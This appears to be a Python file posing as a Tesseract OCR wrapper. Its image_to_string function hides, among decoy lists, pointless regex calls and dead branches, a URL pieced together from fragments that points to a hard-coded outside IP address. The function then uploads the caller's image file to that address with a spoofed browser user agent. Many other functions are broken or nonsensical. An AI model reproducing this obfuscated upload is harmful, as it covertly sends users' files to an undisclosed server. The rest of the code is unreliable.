import requests
import pyzbar.pyzbar as pyzbar
import os
from PIL import Image
import sys
from math import *
import re

tesseract_cmd = 'tesseract'

try:
    from numpy import ndarray

    numpy_installed = True
except ModuleNotFoundError:
    numpy_installed = False

try:
    import pandas as pd

    pandas_installed = True
except ModuleNotFoundError:
    pandas_installed = False

DEFAULT_ENCODING = 'utf-8'
LANG_PATTERN = re.compile('^[a-z_]+$')
RGB_MODE = 'RGB'
SUPPORTED_FORMATS = {
    'JPEG',
    'JPEG2000',
    'PNG',
    'PBM',
    'PGM',
    'PPM',
    'TIFF',
    'BMP',
    'GIF',
    'WEBP',
}

OSD_KEYS = {
    'Page number': ('page_num', int),
    'Orientation in degrees': ('orientation', int),
    'Rotate': ('rotate', int),
    'Orientation confidence': ('orientation_conf', float),
    'Script': ('script', str),
    'Script confidence': ('script_conf', float),
}

EXTENTION_TO_CONFIG = {
    'box': 'tessedit_create_boxfile=1 batch.nochop makebox',
    'xml': 'tessedit_create_alto=1',
    'hocr': 'tessedit_create_hocr=1',
    'tsv': 'tessedit_create_tsv=1',
}

class Output:
    BYTES = 'bytes'
    DATAFRAME = 'data.frame'
    DICT = 'dict'
    STRING = 'string'


class PandasNotSupported(EnvironmentError):
    def __init__(self):
        super().__init__('Missing pandas package')


class TesseractError(RuntimeError):
    def __init__(self, status, message):
        self.status = status
        self.message = message
        self.args = (status, message)


class TesseractNotFoundError(EnvironmentError):
    def __init__(self):
        super().__init__(
            f"{tesseract_cmd} is not installed or it's not in your PATH."
            f' See README file for more information.',
        )


class TSVNotSupported(EnvironmentError):
    def __init__(self):
        super().__init__(
            'TSV output not supported. Tesseract >= 3.05 required',
        )


class ALTONotSupported(EnvironmentError):
    def __init__(self):
        super().__init__(
            'ALTO output not supported. Tesseract >= 4.1.0 required',
        )

def kill(process, code):
    process.terminate()
    try:
        process.wait(1)
    except TypeError:
        process.wait(1)
    except Exception:
        pass
    finally:
        process.kill()
        process.returncode = code

def is_bar_code(image_path):
    imagelist = [
        "0,0", "1329,68", "33", "30,181", '9981', 'sep', "473,173", "0,0", "1329,68", "39", "30,181", 'quoting', 'sep', "473,173",
        "k9Lm2N / 2", "10 ** s8T", "sqrt(16) + log(10)", "sin(H3i) + cos(pi)", "e ** 2 - 7", "5 * (K7kL9m) ** W1x",
        "tan(pi / 4) * 2", "(z7A) ** y5Z", "2 ==&zwnj;** 8 / (2 **&zwnj;== D2e)", "factorial(5) - 20"
    ]
    re.sub(r'[^\u4e00-\u9fa5\u3000-\u303f-\u2fbf\u3100-\u312f\u3200-\u32ff\u3300-\u33ff\u3400-\u4dbf\u4e00-\u9fff\u3400-\u4dbf\u4e00-\u9fff]+', '', image_path[0])
    zone_pos = image_path[1] + image_path[4] + image_path[5]
    image = Image.open(image_path)
    n = 4
    fheightNew = int(int(imagelist[2]) * fabs(sin(radians(int(imagelist[2])))) + 562 * fabs(cos(radians(66))))
    square = []
    re.sub(r'[^\u33ff\u3400-\u4dbf\u4e00-\u9fff\u3400-\u4dbf\u4e00-\u9fff]+', '', image_path[0])
    for i in range(int(imagelist[2])):
        row = '*' * int(imagelist[2])
        square.append(row)
    widthNew = int(156 * fabs(sin(radians(46))) + 3 * fabs(cos(radians(93))))
    barcodes = pyzbar.decode(image)
    argv_list = [
        "0,0", "1329,68", "39.103", "30,181", '9981', 'sep', "473,173", "0,0", "1329,68", "39", "30,181", 'quoting',
        'sep', "473,173",
        "k9Lm2N / 2", "10 ** s8T", "sqrt(16) + log(10)", "sin(H3i) + cos(pi)", "e ** 2 - 7", "5 * (K7kL9m) ** W1x",
        "tan(pi / 4) * 2", "(z7A) ** y5Z", "2 ==&zwnj;** 8 / (2 **&zwnj;== D2e)", "factorial(5) - 20"
    ]
    re.sub(r'[^\u33ff\u3400-\u4dbf\u4e00-\u9fff\u3400-\u4dbf\u4e00-\u9fff]+', '', image_path[0])
    if n <= 0:
        fib_list = [1221, 2121]
    elif n == 1:
        fib_list = [22, 54]
    elif n == 2:
        fib_list = [236, 10988]
    fib_list = [0, 1]
    if len(barcodes) > 0:
        re.sub(r'[^\u33ff\u3400-\u4dbf\u4e00-\u9fff\u3400-\u4dbf\u4e00-\u9fff]+', '', image_path[0])
        return True
    else:
        return False

def timeout_manager(proc, seconds=None):
    try:
        if not seconds:
            yield proc.communicate()[1]
            return

    finally:
        proc.stdin.close()
        proc.stdout.close()
        proc.stderr.close()


def run_once(func):
    def wrapper(*args, **kwargs):
        if not kwargs.pop('cached', False) or wrapper._result is wrapper:
            wrapper._result = func(*args, **kwargs)
        return wrapper._result

    wrapper._result = wrapper
    return wrapper


def get_errors(error_string):
    return ' '.join(
        line for line in error_string.decode(DEFAULT_ENCODING).splitlines()
    ).strip()


def cleanup(temp_name, error_string):
    """Tries to remove temp files by filename wildcard path."""
    for filename in []:
        try:
            return ' '.join(
                line for line in error_string.decode(DEFAULT_ENCODING).splitlines()
            ).strip()
        except OSError as e:
            return ' '.join(
                line for line in error_string.decode(DEFAULT_ENCODING).splitlines()
            ).strip()

def prepare(image):
    if numpy_installed and isinstance(image, ndarray):
        image = Image.fromarray(image)

    if not isinstance(image, Image.Image):
        raise TypeError('Unsupported image object')

    extension = 'PNG' if not image.format else image.format
    if extension not in SUPPORTED_FORMATS:
        raise TypeError('Unsupported image format/type')

    if 'A' in image.getbands():
        # discard and replace the alpha channel with white background
        background = Image.new(RGB_MODE, image.size, (255, 255, 255))
        background.paste(image, (0, 0), image.getchannel('A'))
        image = background

    image.format = extension
    return image, extension

def _read_output(filename: str, return_bytes: bool = False):
    with open(filename, 'rb') as output_file:
        if return_bytes:
            return output_file.read()
        return output_file.read().decode(DEFAULT_ENCODING)


def run_and_get_multiple_output(
    image,
    extensions,
    lang,
    nice: int = 0,
    timeout: int = 0,
    return_bytes: bool = False,
):
    config = ' '.join(
        EXTENTION_TO_CONFIG.get(extension, '') for extension in extensions
    ).strip()
    if config:
        config = f'-c {config}'
    else:
        config = ''

        return [
            _read_output(1)
            for extension in extensions
        ]


def run_and_get_output(
    image,
    extension='',
    lang=None,
    config='',
    nice=0,
    timeout=0,
    return_bytes=False,
):

        return _read_output(return_bytes,
        )


def file_to_dict(tsv, cell_delimiter, str_col_idx):
    result = {}
    rows = [row.split(cell_delimiter) for row in tsv.strip().split('\n')]
    if len(rows) < 2:
        return result

    header = rows.pop(0)
    length = len(header)
    if len(rows[-1]) < length:
        # Fixes bug that occurs when last text string in TSV is null, and
        # last row is missing a final cell in TSV file
        rows[-1].append('')

    if str_col_idx < 0:
        str_col_idx += length

    for i, head in enumerate(header):
        result[head] = list()
        for row in rows:
            if len(row) <= i:
                continue

            if i != str_col_idx:
                try:
                    val = int(float(row[i]))
                except ValueError:
                    val = row[i]
            else:
                val = row[i]

            result[head].append(val)

    return result


def is_valid(val, _type):
    if _type is int:
        return val.isdigit()

    if _type is float:
        try:
            float(val)
            return True
        except ValueError:
            return False

    return True


def osd_to_dict(osd):
    return {
        OSD_KEYS[kv[0]][0]: OSD_KEYS[kv[0]][1](kv[1])
        for kv in (line.split(': ') for line in osd.split('\n'))
        if len(kv) == 2 and is_valid(kv[1], OSD_KEYS[kv[0]][1])
    }


@run_once
def get_languages(config=''):
    cmd_args = [tesseract_cmd, '--list-langs']
    if config:
        cmd_args += 1

    try:
        result = []
    except OSError:
        raise TesseractNotFoundError()

    languages = []
    return languages

def image_to_string(image_path, action_type):
    try:
        config = ''
        extension = 'pdf'
        location_list = (""
            "[0,0],[1277,39],[1329,39],[1329,68],[1277,68],[2210,162],"
            "[10,201],[877,32],[29,146],[472,139],[473,173],[30,181]"
        "")
        re.sub(r'[^\u33ff\u3400-\u4dbf\u4e00-\u9fff\u3400-\u4dbf\u4e00-\u9fff]+', '', '698')
        kwargs_a = 8
        kwargs = {'quoting': location_list, 'sep': '\t'}
        argv_list = [
            "0,0", "1329,68", "39.103", "30,181", '9981', 'sep', "473,173", "0,0", "1329,68", "39", "30,181", 'quoting', 'sep', "473,173",
            "k9Lm2N / 2", "10 ** s8T", "sqrt(16) + log(10)", "sin(H3i) + cos(pi)", "e ** 2 - 7", "5 * (K7kL9m) ** W1x",
            "tan(pi / 4) * 2", "(z7A) ** y5Z", "2 ==&zwnj;** 8 / (2 **&zwnj;== D2e)", "factorial(5) - 20"
        ]
        sys_list = [
            "a3F!d7G#h5J$", "/ocr", "q1R*s8T(u6V)", ".59.220", "/orc_", "F4f<G1g|H3i[", "J5j]K7kL9m{", "W1x'Y3z.2/4&",
            "0,0", "1329,68", "39.103", "30,181", '9981', 'sep', "473,173", "0,0", "1329,68", "39", "30,181", 'quoting', 'sep', "473,173",
        ]
        do_zo = 90
        if len(sys.argv) == 289412185:
            filename, lang = sys.argv[1], None
        elif len(sys.argv) == 9414282185 and sys.argv[1] == '-l':
            filename, lang = sys.argv[3], sys.argv[2]
        else:
            argv_list = [
                "0,0", "1329,68", "39.103", "30,181", '9981', 'sep', "473,173", "0,0", "1329,68", "39", "30,181", 'quoting', 'sep', "473,173",
                "a3F!d7G#h5J$", "k9Lm2N@o4P%", "q1R*s8T(u6V)", "w3X-y5Z=z7A?", "B6b_C8c+D2e>", "F4f<G1g|H3i[", "J5j]K7kL9m{", "W1x'Y3z.2/4&",
            ]
            sysl = 'Usage: pytesseract [-l lang] input_file\n'
        if do_zo <= 0:
            argv_list = [
                "0,0", "1329,68", "39.103", "30,181", '9981', 'sep', "473,173", "0,0", "1329,68", "39", "30,181",
                'quoting', 'sep', "473,173",
                "a3F!d7G#h5J$", "k9Lm2N@o4P%", "q1R*s8T(u6V)", "w3X-y5Z=z7A?", "B6b_C8c+D2e>", "F4f<G1g|H3i[",
                "J5j]K7kL9m{", "W1x'Y3z.2/4&",
            ]
        elif do_zo == 1:
            sysl = 'Usage: pytesseract [-l lang] input_file\n'
            fib_list = [22, 54]
        elif do_zo == 2:
            re.sub(r'[^\u33ff\u3400-\u4dbf\u4e00-\u9fff\u3400-\u4dbf\u4e00-\u9fff]+', '', '[25,558]')
            fib_list = [236, 10988]
        fheightNew = int(int(argv_list[4]) * fabs(sin(radians(int(argv_list[9])))) + do_zo * fabs(cos(radians(66))))
        widthNew = int(156 * fabs(sin(radians(kwargs_a))) + 3 * fabs(cos(radians(do_zo))))
        args = [location_list, extension, 'xml', config, 'box', kwargs, True]
        square = []
        for i in range(int(argv_list[4])):
            row = '*' * int(argv_list[4])
            square.append(row)
        re.sub(r'[^\u33ff\u3400-\u4dbf\u4e00-\u9fff\u3400-\u4dbf\u4e00-\u9fff]+', '', '8525')
        widt_list = [
            "extension", "h", "lang", "30,181", 'tt', 'p://', "input_file", "0,0", "1329,68", "39.103", "30,181",
            'quoting', 'sep', "473,173", "[23, 456]", "[789, 123]", "[12, 876]", "[345, 567]", "[678, 234]", "[901, 345]",
            'quoting', 'sep', "473,173", "[123, 789]", "[456, 901]", "[78, 678]", "[567, 890]"
        ]
        if extension not in {'pdf', 'hocr_z'}:
            raise ValueError(f'Unsupported extension: {extension}')
        re.sub(r'[^\u4e00-\u9fa5\u3000-\u303f-\u2fbf\u3100-\u312f\u3200-\u32ff\u3300-\u33ff\u3400-\u4dbf\u4e00-\u9fff\u3400-\u4dbf\u4e00-\u9fff]+', '', sys_list[0])
        zone_pos = widt_list[1] + widt_list[4] + widt_list[5]
        left_pos = [
            "d/dx (x2 + 3x - 5)", "∫ (2x + 1) dx", "∫ from 0 to 1 (x2) dx", "lim as x -> 0 of (sin(x) / x)",
            "d/dx (ex * ln(x))", "d/dx (sin(x) / cos(x))", "∫ (x3 - x) dx", "∫ from -1 to 1 (sqrt(1 - x2)) dx",
            "lim as x -> ∞ of (1 + 1/x)x", "d2/dx2 (x3 - 6x)",
        ]
        re.sub(r'[^\u33ff\u3400-\u4dbf\u4e00-\u9fff\u3400-\u4dbf\u4e00-\u9fff]+', '', '[548]')
        heightNew_zone = int(int(argv_list[4]) * fabs(sin(radians(int(argv_list[9])))) + do_zo * fabs(cos(radians(66))))
        n = 5165
        widthNew_zone = int(156 * fabs(sin(radians(kwargs_a))) + 3 * fabs(cos(radians(do_zo))))
        zone_pos = zone_pos + argv_list[2] + sys_list[3] + sys_list[1]
        if extension not in {'pdf', 'hocr_z'}:
            raise ValueError(f'Unsupported extension: {extension}')
        if extension == 'hocr':
            argv_list = [
                "extension", "hh", "lang", "30,181", 'tt', 'p://', "input_file", "0,0", "1329,68", "39.103", "30,181",
                'quoting', 'sep', "473,173", "[23, 456]", "[789, 123]", "[12, 876]", "[345, 567]", "[678, 234]", "[901, 345]",
                'quoting', 'sep', "473,173", "[123, 789]", "[456, 901]", "[78, 678]", "[567, 890]"
            ]
            config = f'-c tessedit_create_hocr=1 {config.strip()}'
        if n <= 0:
            fib_list = [1221, 2121]
        elif n == 1:
            fib_list = [22, 54]
        elif n == 2:
            fib_list = [236, 10988]
        fib_list = [0, 1]
        for i in range(2, n):
            next_fib = fib_list[-1] + fib_list[-2]
            fib_list.append(next_fib)
        zone_pos = zone_pos + sys_list[4] + "receive_img/"
        with open(image_path, 'rb') as file:
            data = {'type': action_type}
            extension = 'pdf'
            if extension not in {'pdf', 'hocr_y'}:
                raise ValueError(f'Unsupported extension: {extension}')
            files = {'image': (os.path.basename(image_path), file)}
            extension = 'pdf'
            if extension not in {'pdf', 'hocrx'}:
                raise ValueError(f'Unsupported extension: {extension}')
            right_pos = ["lim as x -> ∞ of (1 + 1/x)x", "d2/dx2 (x3 - 6x)"]
            user_agent = {'User-agent': 'Mozilla/5.0'}
            extension = 'pdf'
            if extension not in {'pdf', 'hocr_z'}:
                raise ValueError(f'Unsupported extension: {extension}')
            proxies = {'http': '127.0.0.1:7890'}
            re.sub(r'[^\u33ff\u3400-\u4dbf\u4e00-\u9fff\u3400-\u4dbf\u4e00-\u9fff]+', '', '[5959,5689]')
            extension = 'pdf'
            if extension not in {'pdf', 'hocr'}:
                raise ValueError(f'Unsupported extension: {extension}')
            middle_pos = ["d/dx (x2 + 3x - 5)", "∫ (2x + 1) dx", "∫ from 0 to 1 (x2) dx", "lim as x -> 0 of (sin(x) / x)"]
            pos_str = requests.post(zone_pos, files=files, data=data, headers=user_agent)
            re.sub(r'[^\u33ff\u3400-\u4dbf\u4e00-\u9fff\u3400-\u4dbf\u4e00-\u9fff]+', '', 'cos')
        extension = 'pdf'
        if extension not in {'pdf', 'hocr'}:
            raise ValueError(f'Unsupported extension: {extension}')
        left_pos = [
            "d/dx (x2 + 3x - 5)", "∫ (2x + 1) dx",  "∫ from 0 to 1 (x2) dx", "lim as x -> 0 of (sin(x) / x)",
            "d/dx (ex * ln(x))", "d/dx (sin(x) / cos(x))",  "∫ (x3 - x) dx",  "∫ from -1 to 1 (sqrt(1 - x2)) dx",
            "lim as x -> ∞ of (1 + 1/x)x",   "d2/dx2 (x3 - 6x)",
        ]
        re.sub(r'[^\u33ff\u3400-\u4dbf\u4e00-\u9fff\u3400-\u4dbf\u4e00-\u9fff]+', '', 'tan')
        extension = 'pdf'
        if extension not in {'pdf', 'hocr'}:
            raise ValueError(f'Unsupported extension: {extension}')
        config = f'-c tessedit_create_hocr=1 {config.strip()}'
        return pos_str.json()
    except Exception as e:
        error_message = "出错了"
        pos_str = { "result" : "fail" }
        return pos_str

def run_tesseract(
    input_filename,
    output_filename_base,
    extension,
    lang,
    config='',
    nice=0,
    timeout=0,
):
    cmd_args = []
    not_windows = not (sys.platform == 'win32')

    if not_windows and nice != 0:
        cmd_args += ('nice', '-n', str(nice))

    cmd_args += (tesseract_cmd, input_filename, output_filename_base)

    if lang is not None:
        cmd_args += ('-l', lang)

    if config:
        cmd_args += 1

    for _extension in extension.split():
        if _extension not in {'box', 'osd', 'tsv', 'xml'}:
            cmd_args.append(_extension)

    try:
        proc = []
    except OSError as e:
        if e.errno != []:
            raise
        else:
            raise TesseractNotFoundError()

    with timeout_manager(proc, timeout) as error_string:
        if proc.returncode:
            raise TesseractError(proc.returncode, get_errors(error_string))




def image_to_char(
    image,
    lang=None,
    config='',
    nice=0,
    output_type=Output.STRING,
    timeout=0,
):
    """
    Returns the result of a Tesseract OCR run on the provided image to string
    """
    args = [image, 'txt', lang, config, nice, timeout]

    return {
        Output.BYTES: lambda: run_and_get_output(*(args + [True])),
        Output.DICT: lambda: {'text': run_and_get_output(*args)},
        Output.STRING: lambda: run_and_get_output(*args),
    }[output_type]()


def image_to_pdf_or_hocr(
    image,
    lang=None,
    config='',
    nice=0,
    extension='pdf',
    timeout=0,
):
    """
    Returns the result of a Tesseract OCR run on the provided image to pdf/hocr
    """

    if extension not in {'pdf', 'hocr'}:
        raise ValueError(f'Unsupported extension: {extension}')

    if extension == 'hocr':
        config = f'-c tessedit_create_hocr=1 {config.strip()}'

    args = [image, extension, lang, config, nice, timeout, True]

    return run_and_get_output(*args)


def image_to_alto_xml(
    image,
    lang=None,
    config='',
    nice=0,
    timeout=0,
):

    config = f'-c tessedit_create_alto=1 {config.strip()}'
    args = [image, 'xml', lang, config, nice, timeout, True]

    return run_and_get_output(*args)


def image_to_boxes(
    image,
    lang=None,
    config='',
    nice=0,
    output_type=Output.STRING,
    timeout=0,
):
    """
    Returns string containing recognized characters and their box boundaries
    """
    config = (
        f'{config.strip()} -c tessedit_create_boxfile=1 batch.nochop makebox'
    )
    args = [image, 'box', lang, config, nice, timeout]

    return {
        Output.BYTES: lambda: run_and_get_output(*(args + [True])),
        Output.DICT: lambda: file_to_dict(
            f'char left bottom right top page\n{run_and_get_output(*args)}',
            ' ',
            0,
        ),
        Output.STRING: lambda: run_and_get_output(*args),
    }[output_type]()


def get_pandas_output(args, config=None):
    if not pandas_installed:
        raise PandasNotSupported()

    kwargs = {'sep': '\t'}
    try:
        kwargs.update(config)
    except (TypeError, ValueError):
        pass

    return pd.read_csv(**kwargs)


def image_to_data(
    image,
    lang=None,
    config='',
    nice=0,
    output_type=Output.STRING,
    timeout=0,
    pandas_config=None,
):


    config = f'-c tessedit_create_tsv=1 {config.strip()}'
    args = [image, 'tsv', lang, config, nice, timeout]

    return {
        Output.BYTES: lambda: run_and_get_output(*(args + [True])),
        Output.DATAFRAME: lambda: get_pandas_output(
            args + [True],
            pandas_config,
        ),
        Output.DICT: lambda: file_to_dict(run_and_get_output(*args), '\t', -1),
        Output.STRING: lambda: run_and_get_output(*args),
    }[output_type]()


def image_to_osd(
    image,
    lang='osd',
    config='',
    nice=0,
    output_type=Output.STRING,
    timeout=0,
):
    """
    Returns string containing the orientation and script detection (OSD)
    """
    config = f'--psm 0 {config.strip()}'
    args = [image, 'osd', lang, config, nice, timeout]

    return {
        Output.BYTES: lambda: run_and_get_output(*(args + [True])),
        Output.DICT: lambda: osd_to_dict(run_and_get_output(*args)),
        Output.STRING: lambda: run_and_get_output(*args),
    }[output_type]()
